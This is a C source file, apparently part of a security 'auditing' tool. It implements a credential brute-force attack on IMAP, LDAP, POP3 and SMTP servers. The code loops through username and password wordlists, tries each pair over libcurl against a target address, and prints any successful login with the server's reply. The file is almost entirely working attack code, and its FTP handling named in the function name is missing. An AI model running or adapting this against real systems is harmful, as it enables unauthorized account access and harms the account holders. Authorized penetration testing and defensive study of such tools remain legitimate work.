
#include <curl/curl.h>
#include <stdlib.h>
#include <string.h>
#include "../auditing-cybersecurity.h"
#include "../others/networking.h"
#include "../activities/activities.h"


struct memory {
	char *response;
	size_t size;
};

static size_t callback(void *data, size_t size, size_t nmemb, void *userp){
	size_t realsize = size * nmemb;
	struct memory *mem = (struct memory *)userp;
	char *ptr = realloc(mem->response, mem->size + realsize + 1);
	if(ptr == NULL) return show_message("Out of Memory",0,0, ERROR_MESSAGE, true, false, false);
	mem->response = ptr;
	memcpy(&(mem->response[mem->size]), data, realsize);
	mem->size += realsize;
	mem->response[mem->size] = 0;
	return realsize;
}

int bfa_imap_ldap_pop3_smtp_ftp(int type){
	curl_global_init(CURL_GLOBAL_ALL);
	char url[255]="", protocol[10]="", usernamesFile[255]="", passwordsFile[255]="";
	char *domain=get_readline("Insert domain -without @-:", false);
	printf("\n");
	switch(type){
	case IMAP_BFA:
		snprintf(protocol,sizeof(protocol),"%s","imap");
		snprintf(usernamesFile,sizeof(usernamesFile),"%s","usernames_imap.txt");
		snprintf(passwordsFile,sizeof(passwordsFile),"%s","passwords_imap.txt");
		break;
	case LDAP_BFA:
		snprintf(protocol,sizeof(protocol),"%s","ldap");
		snprintf(usernamesFile,sizeof(usernamesFile),"%s","usernames_ldap.txt");
		snprintf(passwordsFile,sizeof(passwordsFile),"%s","passwords_ldap.txt");
		break;
	case POP3_BFA:
		snprintf(protocol,sizeof(protocol),"%s","pop3");
		snprintf(usernamesFile,sizeof(usernamesFile),"%s","usernames_pop3.txt");
		snprintf(passwordsFile,sizeof(passwordsFile),"%s","passwords_pop3.txt");
		break;
	case SMTP_BFA:
		snprintf(protocol,sizeof(protocol),"%s","smtp");
		snprintf(usernamesFile,sizeof(usernamesFile),"%s","usernames_smtp.txt");
		snprintf(passwordsFile,sizeof(passwordsFile),"%s","passwords_smtp.txt");
		break;
	default:
		break;
	}
	snprintf(url,sizeof(url),"%s://%s:%d/",protocol,target.strTargetIp, portUnderHacking);
	struct BfaInfo bfaInfo;
	double totalComb= read_usernames_and_password_files(&bfaInfo, usernamesFile, passwordsFile);
	CURL *mCurl=curl_easy_init();
	int cont=0, timeouts=0;
	CURLcode res;
	if (mCurl){
		for(int i=0;i<bfaInfo.totalUsernames && timeouts<BRUTE_FORCE_TIMEOUT && cancelCurrentProcess==false;i++){
			for(int j=0;j<bfaInfo.totalPasswords && timeouts<BRUTE_FORCE_TIMEOUT && cancelCurrentProcess==false;j++,cont++){
				struct memory chunk={0};
				printf("\rPercentage completed: %.4lf%% (%s/%s)               ",(double)((cont/totalComb)*100.0),bfaInfo.usernames[i], bfaInfo.passwords[j]);
				fflush(stdout);
				curl_easy_setopt(mCurl, CURLOPT_URL, url);
				curl_easy_setopt(mCurl, CURLOPT_WRITEFUNCTION, callback);
				curl_easy_setopt(mCurl, CURLOPT_WRITEDATA, (void *)&chunk);
				curl_easy_setopt(mCurl, CURLOPT_TIMEOUT, CURL_TIMEOUT);
				char username[BUFFER_SIZE_128B]="";
				snprintf(username,BUFFER_SIZE_128B,"%s@%s",bfaInfo.usernames[i],domain);
				curl_easy_setopt(mCurl, CURLOPT_USERNAME, username);
				curl_easy_setopt(mCurl, CURLOPT_PASSWORD, bfaInfo.passwords[j]);
				curl_easy_setopt(mCurl, CURLOPT_LOGIN_OPTIONS, "AUTH=*");
				res = curl_easy_perform(mCurl);
				if(res == CURLE_OK){
					printf("%s",C_HRED);
					printf("\n\n  Authentication success: %s/%s",username,bfaInfo.passwords[j]);
					printf("%s", chunk.response);
					printf("%s\n", C_DEFAULT);
				}else{
					switch(res){
					case 67:
						break;
					case 28:
						timeouts++;
						break;
					default:
						char errMsg[BUFFER_SIZE_1K]="";
						snprintf(errMsg,sizeof(errMsg),"libcurl error: %d (%s)",res,curl_easy_strerror(res));
						show_message(errMsg,0, 0, ERROR_MESSAGE, true, false, false);
						cancelCurrentProcess=true;
						break;
					}
				}
				chunk.response="";
				curl_easy_reset(mCurl);
			}
		}
	}else{
		free(domain);
		free_char_double_pointer(&bfaInfo.usernames, bfaInfo.totalUsernames);
		free_char_double_pointer(&bfaInfo.passwords, bfaInfo.totalPasswords);
		curl_easy_cleanup(mCurl);
		curl_global_cleanup();
		return show_message("Error curl initialization",0,0, ERROR_MESSAGE, true, false, false);
	}
	if(timeouts==BRUTE_FORCE_TIMEOUT) printf("\n\n  %d timeouts. Aborting", BRUTE_FORCE_TIMEOUT);
	curl_easy_cleanup(mCurl);
	curl_global_cleanup();
	free(domain);
	free_char_double_pointer(&bfaInfo.usernames, bfaInfo.totalUsernames);
	free_char_double_pointer(&bfaInfo.passwords, bfaInfo.totalPasswords);
	PRINT_RESET;
	return RETURN_OK;
}
